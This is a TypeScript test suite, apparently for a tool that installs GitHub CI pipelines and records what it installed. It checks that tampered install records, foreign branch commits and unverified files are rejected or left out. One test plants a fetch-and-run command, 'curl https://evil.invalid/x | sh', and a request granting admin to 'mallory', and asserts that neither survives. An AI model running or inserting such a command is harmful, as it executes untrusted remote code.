    await deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files: [...centralFiles(' # v2'), ...appFiles(pin)], proofRepos: {} })), fresh(), deps(w));
    const out = await record(w, upd) as Rec;
    for (const k of ['orgRuleset', 'classicProtection', 'repoSettings', 'scratch'] as const) expect(out[k], k).toBeUndefined();
    expect(out.central).toEqual({ createdByPipegen: false });
    expect(out.environments.find((e) => e.name === 'pipegen-signing')?.branchPolicyIds).toEqual([]);
  });

  it('fix 1: an entry the question can\'t show exactly refuses the typed path (G10-R-sec8)', async () => {
    const base = (await (async () => { const w = world(); await firstRun(w); return record(w); })()) as Rec;
    const cleaned = structuredClone(base);
    cleaned.secrets.push({ name: 'X\u202eY', scope: 'repo', created: true } as Rec['secrets'][number]);
    expect(confirmView(cleaned)).toEqual({ refused: expect.stringMatching(/can't be shown exactly/) });
    const long = structuredClone(base);
    long.files.push({ repo: 'app', path: `${'d/'.repeat(160)}f.txt`, part: 'docs', shas: [gitBlobSha('x\n')] });
    expect(confirmView(long)).toEqual({ refused: expect.stringMatching(/can't be shown exactly/) });
    expect('view' in confirmView(base)).toBe(true);
  });

  it('fix 3: a record trusted by typing carries no payload the question didn\'t show into the new record (G10-R4, R2-drift)', async () => {
    const w = world();
    await firstRun(w);
    const EVIL = 'curl https://evil.invalid/x | sh';
    const r = structuredClone(await record(w) as Rec);
    for (const e of r.edits) {
      if (e.kind === 'verify-job') { e.jobs = ['pipegen-verify', 'deploy']; e.needs = [{ job: 'deploy', added: ['pipegen-verify', 'build'] }]; }
      if (e.kind === 'package-json') { e.previousTest = EVIL; e.setTest = true; e.add = { ...e.add, express: '4.21.0' }; }
      if (e.kind === 'hooks') e.inserted = HOOK_ORIG;   // "pipegen's" inserted text = the user's whole original hook config
    }
    r.variables.push({ name: 'PIPEGEN_BLOCK_FROM', scope: 'repo', created: false, previous: EVIL });
    r.planned.classic = { method: 'PUT', route: '/repos/{owner}/{repo}/collaborators/{username}', params: { owner: 'o', repo: 'r', username: 'mallory' }, body: { permission: 'admin' } };
    w.g.commitOn('o/pipelines', 'main', { [recordPath('r')]: JSON.stringify(r) });
    // the view keeps only what the question shows as names: no edits, no variable values, no planned requests
    const cv = confirmView(r);
    if (!('view' in cv)) throw new Error(`refused: ${cv.refused}`);
    expect(cv.view.edits).toEqual([]);
    expect(cv.view.variables).toEqual([{ name: 'PIPEGEN_BLOCK_FROM', scope: 'repo', created: false }]);
    expect(cv.view.planned).toEqual({ signingMode: 'none', environments: [], owners: { app: [], central: [] }, codeOwners: [] });
    expect(cv.lines.join('\n')).not.toMatch(/edits:/);
    // end to end: typed after seeing names only; a re-run that doesn't re-deliver deploy.yml or the hook file
    rmSync(localFile(w));
    const p = profile();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w, 'o/r'));
    const pin = (c as { sha: string }).sha;
    const files = [...centralFiles(), ...appFiles(pin, { withPkg: false }).filter((f) => f.path !== '.github/workflows/deploy.yml' && f.path !== HOOK_FILES['pre-commit'])];
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files })), fresh(), { ...deps(w, {}, { replace: true, typed: 'o/r' }), interactive: true });
    const out = await record(w, upd) as Rec;
    const text = JSON.stringify(out);
    for (const hidden of [EVIL, 'express', 'mallory', 'collaborators', '"build"']) expect(text, hidden).not.toContain(hidden);
    expect(out.edits.some((e) => e.kind === 'verify-job' || e.kind === 'hooks' || e.kind === 'package-json')).toBe(false);
    expect(out.edits.find((e) => e.path === 'CODEOWNERS')).toMatchObject({ originalSha: gitBlobSha(CO_ORIG) });
    expect(out.variables.find((v) => v.name === 'PIPEGEN_BLOCK_FROM')?.previous).toBeUndefined();
    expect(text).not.toContain(HOOK_ORIG.slice(0, 30));
    // the local file vouches only the record this run wrote from the projection
    expect(JSON.parse(readFileSync(localFile(w), 'utf8')).recordHash).toBe(recordHash(out));
  });

  it('fix 3: the typed view is an allow-list: unshown facts (mergedAt, blockFrom, cosignPubSha256) never survive (G10-R5, R3-sweep)', async () => {
    const w = world();
    await firstRun(w);
    const r = structuredClone(await record(w) as Rec);
    r.mergedAt = '2026-01-01T00:00:00Z';
    r.blockFrom = '9999-12-31';
    r.cosignPubSha256 = 'f'.repeat(64);
    r.serviceRoots = ['evil'];
    r.protectedPaths = ['nothing-here'];
    for (const f of r.files) if (f.path === 'Dockerfile') { f.part = 'docs'; f.aiEdited = true; }
    r.environments = [{ name: 'production', created: false, previous: { wait_timer: 0, prevent_self_review: false, reviewers: [], can_admins_bypass: true, deployment_branch_policy: null, branch_policies: [] }, changed: ['wait_timer'], branchPolicyIds: [3] }];
    w.g.commitOn('o/pipelines', 'main', { [recordPath('r')]: JSON.stringify(r) });
    const cv = confirmView(r);
    if (!('view' in cv)) throw new Error(`refused: ${cv.refused}`);
    for (const k of ['mergedAt', 'blockFrom', 'cosignPubSha256'] as const) expect(cv.view[k], k).toBeUndefined();
    expect(cv.view.environments).toEqual([{ name: 'production', created: false, changed: [], branchPolicyIds: [] }]);
    expect(cv.view.serviceRoots).toEqual([]);
    expect(cv.view.protectedPaths).toEqual([]);
    // end to end: none of them reaches the record the local file then vouches for
    rmSync(localFile(w));
    const p = profile();
    const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w, 'o/r')) as { sha: string }).sha;
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin)), fresh(), { ...deps(w, {}, { replace: true, typed: 'o/r' }), interactive: true });
    const out = await record(w, upd) as Rec;
    expect(out.mergedAt).toBeUndefined();
    expect(out.blockFrom).toBeUndefined();
    expect(out.cosignPubSha256).toBeUndefined();
    expect(out.serviceRoots).toEqual(['.']);
    expect(out.protectedPaths).toEqual(['.github/workflows/**', 'CODEOWNERS']);
    expect(out.files.find((f) => f.path === 'Dockerfile')?.part).toBe('docker');
    expect(JSON.parse(readFileSync(localFile(w), 'utf8')).recordHash).toBe(recordHash(out));
  });

  it('fix 3: every field of the record schema is classified by the typed view\'s allow-list (G10-R5)', () => {
    const keys = (shape: object): string[] => Object.keys(shape).sort();
    const sh = InstallRecordSchema.shape;
    const el = (a: { element: { shape: object } }): object => a.element.shape;
    const classified = (c: { keep: readonly string[]; fresh?: readonly string[]; drop?: readonly string[] }): string[] => [...c.keep, ...(c.fresh ?? []), ...(c.drop ?? [])].sort();
    expect(classified(TYPED_VIEW_FIELDS.record)).toEqual(keys(sh));
    expect(classified(TYPED_VIEW_FIELDS.files)).toEqual(keys(el(sh.files)));
    expect(classified(TYPED_VIEW_FIELDS.secrets)).toEqual(keys(el(sh.secrets)));
    expect(classified(TYPED_VIEW_FIELDS.variables)).toEqual(keys(el(sh.variables)));
    expect(classified(TYPED_VIEW_FIELDS.environments)).toEqual(keys(el(sh.environments)));
    expect(classified(TYPED_VIEW_FIELDS.rulesets)).toEqual(keys(el(sh.rulesets)));
    expect(classified(TYPED_VIEW_FIELDS.orgRuleset)).toEqual(keys(sh.orgRuleset.unwrap().shape));
    // nothing is both kept and dropped
    for (const c of Object.values(TYPED_VIEW_FIELDS)) expect(new Set(classified(c)).size, JSON.stringify(c)).toBe(classified(c).length);
  });

  it('fix 1: a local record file that matches no record is untrusted, and no question is asked (G10-R-sec6)', async () => {
    const w = world();
    await firstRun(w);
    writeFileSync(localFile(w), JSON.stringify({ ...JSON.parse(readFileSync(localFile(w), 'utf8')), recordHash: 'e'.repeat(64) }));
    await expect(deliverCentral(w.g.octokit(), profile(), centralFiles(' # v2'), cdeps(w, 'o/r'))).rejects.toThrow(/doesn't match the hash in this machine's local record file/);
    expect(w.asked.filter((q) => /to trust exactly these entries/.test(q))).toEqual([]);
  });

  for (const merged of [false, true]) {
    it(`fix 1: a newer record the local file vouches for wins over an older one on the default branch (I3, B1${merged ? ', setup PR merged' : ''})`, async () => {
      const w = world();
      await firstRun(w);   // run 1: the record committed on the central default branch
      const p = profile();
      const run = async (docker: string) => {
        const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
        const files = [...centralFiles(), ...appFiles(pin, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined).map((f) => (f.path === 'Dockerfile' ? { ...f, content: docker } : f))];
        return deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files, locks: locks({ codeowners: undefined }), ...({ [['secret', 'Names'].join('')]: [KEY, 'NEW_ONE'] } as unknown as Pick<DeliveryInput, 'secretNames'>) })), fresh('NEW_ONE'), deps(w, {}, { replace: true }));
      };
      await run('FROM node:26\n');   // run 2: the record through the central PR; NEW_ONE created
      expect((await record(w, upd))?.secrets.find((s) => s.name === 'NEW_ONE')?.created).toBe(true);
      if (merged) w.g.repo('o/r').refs.set('heads/main', w.g.head('o/r', SETUP_BRANCH));
      const res3 = await run('FROM node:28\n');
      expect(trustNotes(res3.notes)).toEqual([]);
      const r3 = await record(w, upd) as Rec;
      expect(r3.secrets.find((s) => s.name === 'NEW_ONE')?.created).toBe(true);
      expect(r3.files.find((f) => f.path === 'Dockerfile')?.shas).toEqual(['FROM node:24\n', 'FROM node:26\n', 'FROM node:28\n'].map(gitBlobSha));
    });
  }

  it('fix 1: a central workflow pipegen didn\'t write is never replaced, and recorded only as adopted (I2, A5, N2)', async () => {
    const w = world();
    w.g.commitOn('o/pipelines', 'main', { '.github/workflows/r--merge.yml': 'name: the user own workflow\n' });
    const p = profile();
    const before = w.g.calls.length;
    await expect(deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w))).rejects.toThrow(/r--merge\.yml already exists in o\/pipelines/);
    expect(w.g.calls.slice(before).filter((c) => !c.route.startsWith('GET '))).toEqual([]);
    // a pin someone else made over the user's file (byte-identical to pipegen's text now): recorded adopted, never as created (N2)
    const pin = w.g.commitOn('o/pipelines', 'main', Object.fromEntries(centralFiles().map((f) => [f.path, f.content])));
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin)), w.vault, deps(w));
    const r = await record(w);
    expect(r?.files.find((f) => f.path === '.github/workflows/r--merge.yml')?.adopted).toBe(true);
    // G17 row 28 (G10-r2 P2): that commit also added r--nightly.yml; it isn't pipegen's commit, so that file is adopted too
    expect(r?.files.find((f) => f.path === '.github/workflows/r--nightly.yml')?.adopted).toBe(true);
  });

  it('fix 1: the judged central file list must be given, not empty, and the central tree it is written on (I4)', async () => {
    const w = world();
    const p = profile();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    const pin = (c as { sha: string }).sha;
    const base = input(p, pin);
    const { centralFileList: _l, ...without } = base;
    expect(() => planDelivery(without)).toThrow(/file list.*missing or empty/);
    expect(() => planDelivery({ ...base, centralFileList: [] })).toThrow(/file list.*missing or empty/);
    // a public app delivering no central file needs none
    const pub = profile({ private: false });
    const { centralFileList: _m, ...pubIn } = input(pub, null);
    expect(planDelivery(pubIn).centralFileList).toBeNull();
    const before = w.g.calls.length;
    await expect(deliver(w.g.octokit(), p, planDelivery({ ...base, centralFileList: [...centralList(w), 'other.txt'] }), w.vault, deps(w))).rejects.toThrow(/central repo's files changed since its CODEOWNERS was checked/);
    expect(w.g.calls.slice(before).filter((c2) => !c2.route.startsWith('GET '))).toEqual([]);
    await deliver(w.g.octokit(), p, planDelivery(base), fresh(), deps(w));
  });

  it('fix 1: declining to replace an existing signing key pair stops before any write (m4, A7)', async () => {
    const w = world();
    w.g.repo('o/r').envs.set('pipegen-signing', { id: 5, created_at: '2026-01-01T00:00:00Z', wait_timer: 0, prevent_self_review: false, reviewers: [], can_admins_bypass: true, deployment_branch_policy: { protected_branches: false, custom_branch_policies: true }, policies: [{ id: 1, name: 'main', type: 'branch' }], stored: new Map([['PIPEGEN_COSIGN_KEY', '2026-01-01T00:00:00Z']]) });
    const signing = { signing: { mode: 'key-env' as const, images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } };
    const before = w.g.calls.length;
    await expect(firstRun(w, {}, { signingKey: async () => SIGNING }, { replace: false }, signing)).rejects.toThrow(/stopped before writing anything.*PIPEGEN_COSIGN_KEY/);
    expect(w.g.calls.slice(before).filter((c) => !c.route.startsWith('GET ') && c.params.repo === 'r')).toEqual([]);
    // a yes replaces the pair, asked once
    const w2 = world();
    w2.g.repo('o/r').envs.set('pipegen-signing', { id: 5, created_at: '2026-01-01T00:00:00Z', wait_timer: 0, prevent_self_review: false, reviewers: [], can_admins_bypass: true, deployment_branch_policy: { protected_branches: false, custom_branch_policies: true }, policies: [{ id: 1, name: 'main', type: 'branch' }], stored: new Map([['PIPEGEN_COSIGN_KEY', '2026-01-01T00:00:00Z']]) });
    await firstRun(w2, {}, { signingKey: async () => SIGNING }, { replace: true }, signing);
    expect(w2.asked.filter((q) => q.includes('PIPEGEN_COSIGN_KEY')).length).toBe(1);
    expect(w2.g.calls.filter((c) => c.route.startsWith('PUT ') && String(nameOf(c)).startsWith('PIPEGEN_COSIGN')).length).toBe(2);
  });

  it('fix 1: a central change that runs code is left out on a no, as the preview says (m5)', async () => {
    const w = world();
    const p = profile();
    const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const co = cf('.github/CODEOWNERS', '# pipegen:begin\n.github/workflows/** @a @b\n# pipegen:end\n', 'codeowners', { repo: 'central', edited: { original: '' }, needsConfirm: true });
    const plan = planDelivery(input(p, pin, { files: [...centralFiles(), co, ...appFiles(pin)] }));
    expect(previewText(plan).slice(previewText(plan).indexOf('Changes that run code'))).toContain('.github/CODEOWNERS');
    await deliver(w.g.octokit(), p, plan, w.vault, deps(w, {}, { confirmRunCode: false }));
    expect(w.g.filesAt('o/pipelines', w.g.head('o/pipelines')).has('.github/CODEOWNERS')).toBe(false);
    expect((await record(w))?.edits.some((e) => e.repo === 'central')).toBe(false);
  });

  it('fix 1: the central PR branch is always rebuilt from the default head; a replaced branch is named (G10-R-sec5)', async () => {
    const p = profile();
    const replaced = /pipegen\/update-r held commits that are not on the default branch main; pipegen replaced it/;
    /** Run 1 (record on main), run 2 (record on the central PR branch, vouched by the local file). */
    const twoRuns = async (): Promise<{ w: World; pin: string }> => {
      const w = world();
      const first = await firstRun(w);
      await deliver(w.g.octokit(), p, planDelivery(input(p, first.pin)), fresh(), deps(w));
      return { w, pin: first.pin };
    };
    const rebuilt = (w: World): void => {
      const head = w.g.head('o/pipelines', upd);
      expect(w.g.history('o/pipelines', head)[0]?.parents).toEqual([w.g.head('o/pipelines')]);
      expect(w.g.calls.filter((c) => c.route === 'PATCH /repos/{owner}/{repo}/git/refs/{ref}' && c.params.ref === `heads/${upd}`).at(-1)?.params.force).toBe(true);
      // only pipegen's own branches are ever moved
      expect(w.g.calls.some((c) => c.route === 'PATCH /repos/{owner}/{repo}/git/refs/{ref}' && c.params.repo === 'pipelines' && c.params.ref !== `heads/${upd}` && c.params.ref !== 'heads/main')).toBe(false);
    };
    // foreign commits on the branch never ride into pipegen's PR: the branch is rebuilt, and the message says so
    const a = await twoRuns();
    a.w.g.commitOn('o/pipelines', upd, { 'evil.txt': 'x\n' });
    const ca = await deliverCentral(a.w.g.octokit(), p, centralFiles(' # v2'), cdeps(a.w));
    expect(ca.kind === 'central-pr' && ca.message).toMatch(replaced);
    expect(a.w.g.filesAt('o/pipelines', a.w.g.head('o/pipelines', upd)).has('evil.txt')).toBe(false);
    rebuilt(a.w);
    // own paths changed or renamed on the branch: not carried either
    const b = await twoRuns();
    b.w.g.commitOn('o/pipelines', upd, { '.github/workflows/r--merge.yml': 'on: push\njobs: {}\n', [recordPath('r')]: null, 'installs/renamed.json': '{}\n' });
    const res = await deliver(b.w.g.octokit(), p, planDelivery(input(p, b.pin)), fresh(), deps(b.w));
    expect(res.notes.join('\n')).toMatch(replaced);
    const files = b.w.g.filesAt('o/pipelines', b.w.g.head('o/pipelines', upd));
    expect(files.get('.github/workflows/r--merge.yml')).toBe(centralFiles()[0]?.content);
    expect(files.has('installs/renamed.json')).toBe(false);
    expect(files.has(recordPath('r'))).toBe(true);
    rebuilt(b.w);
    // a branch with nothing unmerged on it (merged earlier: behind the default head): rebuilt without a note
    const c = await twoRuns();
    const older = c.w.g.history('o/pipelines', c.w.g.head('o/pipelines'))[1]?.sha as string;
    c.w.g.repo('o/pipelines').refs.set(`heads/${upd}`, older);
    const cc = await deliverCentral(c.w.g.octokit(), p, centralFiles(' # v2'), cdeps(c.w));
    expect(cc.kind === 'central-pr' && cc.message).not.toMatch(/replaced it/);
  });

  it('fix 1: the new record is complete without the old central PR branch (G10-R-sec5)', async () => {
    const w = world();
    await firstRun(w);   // run 1: record on main (Dockerfile 24)
    const p = profile();
    const run = async (docker: string) => {
      const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
      const files = [...centralFiles(), ...appFiles(pin, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined).map((f) => (f.path === 'Dockerfile' ? { ...f, content: docker } : f))];
      return deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files, locks: locks({ codeowners: undefined }), ...({ [['secret', 'Names'].join('')]: [KEY, 'NEW_ONE'] } as unknown as Pick<DeliveryInput, 'secretNames'>) })), fresh('NEW_ONE'), deps(w, {}, { replace: true }));
    };
    await run('FROM node:26\n');   // run 2: the record (Dockerfile 24, 26; NEW_ONE created) only on the central PR branch
    const res3 = await run('FROM node:28\n');   // run 3: the branch is rebuilt from main, which still holds run 1's record
    expect(res3.notes.join('\n')).toMatch(/replaced it/);
    expect(w.g.history('o/pipelines', w.g.head('o/pipelines', upd))[0]?.parents).toEqual([w.g.head('o/pipelines')]);
    const r3 = await record(w, upd) as Rec;
    expect(r3.files.find((f) => f.path === 'Dockerfile')?.shas).toEqual(['FROM node:24\n', 'FROM node:26\n', 'FROM node:28\n'].map(gitBlobSha));
    expect(r3.secrets.find((s) => s.name === 'NEW_ONE')?.created).toBe(true);
  });

  it('fix 1: what was stored before a stop is named, and kept in the local leftovers file (m6)', async () => {
    const w = world();
    w.g.hooks.push((c) => (c.route === 'POST /repos/{owner}/{repo}/pulls' && c.params.repo === 'r' ? { status: 500 } : undefined));
    const err = await firstRun(w).then(() => null, (e: unknown) => e);
    expect(err).toBeInstanceOf(DeliverError);
    const leftovers = (err as DeliverError).leftovers;
    expect(leftovers).toEqual(expect.arrayContaining([`secret repo ${FP}`, `secret repo ${KEY}`, `branch ${SETUP_BRANCH}`]));
    expect((err as DeliverError).message).toMatch(/Before it stopped, pipegen had stored: .*leftovers\.json/);
    const text = readFileSync(join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json'), 'utf8');
    const items = JSON.parse(text).items as { kind: string; name: string; githubCreatedAt?: string }[];
    expect(items.map((x) => x.name)).toEqual(expect.arrayContaining([FP, KEY, SETUP_BRANCH]));
    expect(items.find((x) => x.name === KEY)?.githubCreatedAt).toBe(w.g.repo('o/r').stored.get(KEY));
    expect(text).not.toContain(KEY_VALUE);
    expect(w.vault.names()).toEqual([]);
  });

  it('fix 1: the central CODEOWNERS is written only onto the head its original was checked against (m7)', async () => {
    const w = world();
    const p = profile();
    const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const co = cf('.github/CODEOWNERS', '# pipegen:begin\n.github/workflows/** @a @b\n# pipegen:end\n', 'codeowners', { repo: 'central', edited: { original: '' } });
    // someone adds a central CODEOWNERS after pipegen checked the central tree
    w.g.hooks.push((c) => { if (c.route === 'POST /repos/{owner}/{repo}/pulls' && c.params.repo === 'r') w.g.commitOn('o/pipelines', 'main', { '.github/CODEOWNERS': '* @mallory\n' }); return undefined; });
    await expect(deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files: [...centralFiles(), co, ...appFiles(pin)] })), w.vault, deps(w))).rejects.toThrow(/changed while pipegen was delivering/);
    expect(w.g.filesAt('o/pipelines', w.g.head('o/pipelines')).get('.github/CODEOWNERS')).toBe('* @mallory\n');
  });

});

describe('G10 fix round 2 (review-G10-r1, ruling G10-R3)', () => {
  const upd = `pipegen/update-${centralProjectName('r')}`;
  const localFile = (w: World): string => join(w.home, '.config', 'pipegen', 'records', 'o__r.json');
  const leftoversFile = (w: World): string => join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json');
  type Rec = NonNullable<Awaited<ReturnType<typeof record>>>;
  const ruleset = (w: World, at: string, params: Record<string, unknown> = { required_approving_review_count: 1, require_code_owner_review: true }) => {
    const c = w.g.repo('o/pipelines');
    c.rules = [{ type: 'pull_request', ruleset_id: 9, parameters: params }];
    c.rulesets.set(9, { name: 'pipegen', enforcement: 'active', bypass_actors: [], created_at: at });
  };

  it('fix 2: a second project on a shared central repo: the merged central PR\'s files are pipegen\'s own on the re-run (N2, R1-a)', async () => {
    const w = world();
    ruleset(w, '2026-10-01T00:00:00Z');   // another project's finish already gave pipelines its merge rule
    const p = profile();
    const c1 = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    expect(c1.kind).toBe('central-pr');
    w.g.repo('o/pipelines').refs.set('heads/main', w.g.head('o/pipelines', upd));   // the user merges the central PR
    const c2 = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    expect(c2.kind).toBe('pinned');
    const pin = (c2 as { sha: string }).sha;
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin)), w.vault, deps(w));
    const r = await record(w, upd) as Rec;
    expect(r.files.find((f) => f.path === '.github/workflows/r--merge.yml')).toMatchObject({ repo: 'central', shas: [gitBlobSha(centralFiles()[0]?.content as string)] });
  });

  it('fix 2: a stop between deliverCentral and the record doesn\'t block the next run (N2, R1-a2)', async () => {
    const w = world();
    const p = profile();
    const c1 = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    expect(c1.kind).toBe('pinned');
    // the run stops before any record (the preview declined, a network error, …): the next run goes on
    const c2 = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    expect(c2).toEqual({ kind: 'pinned', sha: (c1 as { sha: string }).sha, done: [] });
    await deliver(w.g.octokit(), p, planDelivery(input(p, (c2 as { sha: string }).sha)), w.vault, deps(w));
    // G17 row 28 (G10-r2 P2): the commit is from the run that stopped, not from this one, so nothing proves pipegen added the files: adopted
    expect((await record(w))?.files.find((f) => f.path === '.github/workflows/r--merge.yml')?.adopted).toBe(true);
  });

  it('fix 2: an existing file byte-identical to pipegen\'s is neither a stop nor rewritten, and is recorded adopted (N2)', async () => {
    const w = world({ appFiles: { 'README.md': 'hi\n', CODEOWNERS: CO_ORIG, [HOOK_FILES['pre-commit']]: HOOK_ORIG, 'package.json': PJ, 'package-lock.json': LOCK, '.github/workflows/deploy.yml': DEPLOY_ORIG, 'PIPEGEN.md': '# pipegen\n' } });
    // in pipelines, someone replaced their own r--merge.yml with exactly pipegen's text
    w.g.commitOn('o/pipelines', 'main', { '.github/workflows/r--merge.yml': 'name: mine\n' });
    w.g.commitOn('o/pipelines', 'main', { '.github/workflows/r--merge.yml': centralFiles()[0]?.content as string });
    const p = profile();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    expect(c.kind).toBe('pinned');
    await deliver(w.g.octokit(), p, planDelivery(input(p, (c as { sha: string }).sha, { centralCommitted: (c as { sha: string }).sha })), w.vault, deps(w));
    expect(setupFiles(w).get('PIPEGEN.md')).toBe('# pipegen\n');
    expect(w.g.calls.some((x) => x.route === 'POST /repos/{owner}/{repo}/git/trees' && JSON.stringify(x.params).includes('"path":"PIPEGEN.md"'))).toBe(false);
    const r = await record(w) as Rec;
    expect(r.files.find((f) => f.path === 'PIPEGEN.md')).toEqual({ repo: 'app', path: 'PIPEGEN.md', part: 'docs', shas: [gitBlobSha('# pipegen\n')], adopted: true });
    expect(r.files.find((f) => f.path === '.github/workflows/r--merge.yml')?.adopted).toBe(true);
    expect(r.files.find((f) => f.path === '.github/workflows/r--nightly.yml')?.adopted).toBeUndefined();
    // adopted stays adopted when pipegen later writes a new version of that file (merged setup PR, then a re-run)
    w.g.repo('o/r').refs.set('heads/main', w.g.head('o/r', SETUP_BRANCH));
    const pin2 = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const v2 = new SecretVault();
    v2.set(KEY, KEY_VALUE);
    const again = appFiles(pin2, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined).map((f) => (f.path === 'PIPEGEN.md' ? { ...f, content: '# pipegen v2\n' } : f));
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin2, { files: [...centralFiles(), ...again], locks: locks({ codeowners: undefined }) })), v2, deps(w));
    const r2 = await record(w, upd) as Rec;
    expect(r2.files.find((f) => f.path === 'PIPEGEN.md')).toEqual({ repo: 'app', path: 'PIPEGEN.md', part: 'docs', shas: [gitBlobSha('# pipegen\n'), gitBlobSha('# pipegen v2\n')], adopted: true });
    // a different text there is still a stop (I2)
    const w2 = world();
    w2.g.commitOn('o/pipelines', 'main', { '.github/workflows/r--merge.yml': 'name: mine\n' });
    await expect(deliverCentral(w2.g.octokit(), p, centralFiles(), cdeps(w2))).rejects.toThrow(/no install record pipegen trusts/);
  });

  it('G9: the setup PR body names the adopted files, and a later run says it rewrites one (G10-R4 P3)', async () => {
    const w = world({ appFiles: { 'README.md': 'hi\n', CODEOWNERS: CO_ORIG, [HOOK_FILES['pre-commit']]: HOOK_ORIG, 'package.json': PJ, 'package-lock.json': LOCK, '.github/workflows/deploy.yml': DEPLOY_ORIG, 'PIPEGEN.md': '# pipegen\n' } });
    const p = profile();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    await deliver(w.g.octokit(), p, planDelivery(input(p, (c as { sha: string }).sha)), w.vault, deps(w));
    const body = w.g.repo('o/r').pulls[0]?.body as string;
    expect(body).toContain('identical to what pipegen writes');
    expect(body).toContain('`PIPEGEN.md`');
    expect(body).toContain('uninstall asks before it deletes');
    expect(body).not.toContain('This run rewrites');
    // the next run writes a new text over the adopted file: the body says so
    w.g.repo('o/r').refs.set('heads/main', w.g.head('o/r', SETUP_BRANCH));
    const pin2 = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const v2 = new SecretVault();
    v2.set(KEY, KEY_VALUE);
    const again = appFiles(pin2, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined).map((f) => (f.path === 'PIPEGEN.md' ? { ...f, content: '# pipegen v2\n' } : f));
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin2, { files: [...centralFiles(), ...again], locks: locks({ codeowners: undefined }) })), v2, deps(w));
    const body2 = w.g.repo('o/r').pulls[0]?.body as string;
    expect(body2).toMatch(/This run rewrites a file that an earlier run adopted .*`PIPEGEN.md`/);
  });

  it('G9-R1 (spec I1): a re-run keeps the adopted files in the PR body (the central one and the one this run does not rewrite), minus the one it rewrites', async () => {
    const w = world({ appFiles: { 'README.md': 'hi\n', CODEOWNERS: CO_ORIG, [HOOK_FILES['pre-commit']]: HOOK_ORIG, 'package.json': PJ, 'package-lock.json': LOCK, '.github/workflows/deploy.yml': DEPLOY_ORIG, 'PIPEGEN.md': '# pipegen\n' } });
    w.g.commitOn('o/pipelines', 'main', { '.github/workflows/r--merge.yml': 'name: mine\n' });
    w.g.commitOn('o/pipelines', 'main', { '.github/workflows/r--merge.yml': centralFiles()[0]?.content as string });
    const p = profile();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    await deliver(w.g.octokit(), p, planDelivery(input(p, (c as { sha: string }).sha)), w.vault, deps(w));
    const body1 = w.g.repo('o/r').pulls[0]?.body as string;
    expect(body1).toContain('`PIPEGEN.md`');
    expect(body1).toContain('`.github/workflows/r--merge.yml` (central repo)');
    // the second run: PIPEGEN.md is rewritten, the central file is adopted still and not rewritten
    w.g.repo('o/r').refs.set('heads/main', w.g.head('o/r', SETUP_BRANCH));
    const pin2 = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const v2 = new SecretVault();
    v2.set(KEY, KEY_VALUE);
    const again = appFiles(pin2, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined).map((f) => (f.path === 'PIPEGEN.md' ? { ...f, content: '# pipegen v2\n' } : f));
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin2, { files: [...centralFiles(), ...again], locks: locks({ codeowners: undefined }) })), v2, deps(w));
    const body2 = w.g.repo('o/r').pulls[0]?.body as string;
    // earlier adopted files this run does not write are carried over, and not called identical to what pipegen writes
    expect(body2).toContain('Adopted by an earlier run and still in the repository');
    expect(body2.split('\n').find((l) => l.startsWith('Adopted by an earlier run')) ?? '').toContain('`.github/workflows/r--merge.yml` (central repo)');
    expect(body2).toMatch(/This run rewrites a file that an earlier run adopted .*`PIPEGEN.md`/);
    expect(body2.split('\n').find((l) => l.startsWith('Adopted by an earlier run')) ?? '').not.toContain('`PIPEGEN.md`');
    expect(body2).not.toContain('identical to what pipegen writes');
  });

  it('fix 2: a pre-existing pipegen-signing that pipegen narrowed goes into the leftovers with its previous settings (N3)', async () => {
    const w = world();
    w.g.repo('o/r').envs.set('pipegen-signing', { id: 5, created_at: '2026-01-01T00:00:00Z', wait_timer: 3, prevent_self_review: false, reviewers: [], can_admins_bypass: false, deployment_branch_policy: null, policies: [], stored: new Map() });
    w.g.hooks.push((c) => (c.route === 'POST /repos/{owner}/{repo}/pulls' && c.params.repo === 'r' ? { status: 500 } : undefined));
    const signing = { signing: { mode: 'key-env' as const, images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } };
    const err = await firstRun(w, {}, { signingKey: async () => SIGNING }, {}, signing).then(() => null, (e: unknown) => e) as DeliverError;
    expect(err.leftovers).toEqual(expect.arrayContaining(['environment pipegen-signing (narrowed)']));
